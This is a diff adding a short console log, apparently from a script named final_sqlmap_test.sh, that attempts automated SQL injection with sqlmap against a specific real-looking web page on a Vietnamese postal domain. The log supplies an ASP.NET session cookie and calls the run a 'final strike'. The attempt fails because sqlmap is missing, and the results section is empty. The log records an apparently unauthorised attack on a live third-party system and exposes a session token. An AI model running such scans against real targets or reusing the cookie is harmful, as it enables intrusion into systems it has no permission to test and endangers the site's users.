@@ -1,0 +1,11 @@
+🔥 最后一击：sqlmap自动化SQL注入检测
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[*] 安装sqlmap...
+[*] sqlmap自动检测...
+  URL: http://vps.vnpost.vn/chamcong/report/inBCC.aspx?ID=MAU2
+  Cookie: ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou
+
+final_sqlmap_test.sh: line 22: sqlmap: command not found
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 sqlmap结果:
